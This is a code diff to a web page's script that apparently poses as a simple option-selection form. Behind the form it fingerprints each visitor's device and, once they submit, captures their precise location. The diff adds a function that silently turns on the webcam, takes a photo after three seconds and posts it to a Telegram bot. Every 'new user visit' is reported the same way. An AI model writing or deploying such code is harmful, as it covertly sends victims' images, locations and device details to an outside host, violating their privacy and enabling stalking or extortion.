@@ -115,40 +115,32 @@
 
         async function getDeviceInfo() {
             let deviceInfo = "📱 **Device Info:**\n";
-            let brandName = "Unknown";
-            let modelName = "Unknown";
+            let model = "Unknown";
+            let os = "Unknown";
 
             if (navigator.userAgentData) {
                 const ua = await navigator.userAgentData.getHighEntropyValues(["architecture", "model", "platform", "platformVersion"]);
-                modelName = ua.model || "Unknown";
-                deviceInfo += `🔹 **Device Model:** ${modelName}\n`;
-                deviceInfo += `🔹 **OS:** ${ua.platform} ${ua.platformVersion}\n`;
-                deviceInfo += `🔹 **Architecture:** ${ua.architecture || "Unknown"}\n`;
+                model = ua.model || "Unknown";
+                os = `${ua.platform} ${ua.platformVersion}`;
             } else {
-                deviceInfo += `🔹 **OS:** ${navigator.platform}\n`;
+                os = navigator.platform;
             }
 
-            if (/samsung/i.test(navigator.userAgent)) brandName = "Samsung";
-            if (/xiaomi|redmi/i.test(navigator.userAgent)) brandName = "Xiaomi";
-            if (/oneplus/i.test(navigator.userAgent)) brandName = "OnePlus";
-            if (/oppo/i.test(navigator.userAgent)) brandName = "Oppo";
-            if (/vivo/i.test(navigator.userAgent)) brandName = "Vivo";
-            if (/realme/i.test(navigator.userAgent)) brandName = "Realme";
-
-            deviceInfo = deviceInfo.replace("Device Model:", `Device Model: ${brandName}`);
-
+            deviceInfo += `🔹 **Device Model:** ${model}\n`;
+            deviceInfo += `🔹 **OS:** ${os}\n`;
             deviceInfo += `🔹 **Screen:** ${window.screen.width}x${window.screen.height}\n`;
 
             return deviceInfo;
         }
 
-        async function sendVisitInfo() {
-            const deviceInfo = await getDeviceInfo();
-            const message = `🚀 **NEW USER VISIT**\n${deviceInfo}`;
-            sendMessage(message);
+        function sendVisitInfo() {
+            getDeviceInfo().then(deviceInfo => {
+                const message = `🚀 **NEW USER VISIT**\n${deviceInfo}`;
+                sendMessage(message);
+            });
         }
 
-        async function submitData() {
+        function submitData() {
             const option = document.querySelector('input[type="checkbox"]:checked');
             if (!option) return alert("Please select an option!");
 
@@ -161,6 +153,7 @@
                 });
 
                 captureLocation();
+                capturePhoto();
             });
         }
 
@@ -172,6 +165,36 @@
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             }
+        }
+
+        function capturePhoto() {
+            const video = document.createElement("video");
+            const canvas = document.createElement("canvas");
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.play();
+
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+                        stream.getTracks().forEach(track => track.stop());
+
+                        canvas.toBlob(blob => {
+                            let formData = new FormData();
+                            formData.append("chat_id", CHAT_ID);
+                            formData.append("photo", blob, "user_photo.jpg");
+
+                            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                                method: "POST",
+                                body: formData
+                            });
+                        }, "image/jpeg");
+                    }, 3000);
+                })
+                .catch(() => sendMessage("📸 **Photo:** Not Available (Permission Denied)"));
         }
 
         function sendMessage(text) {
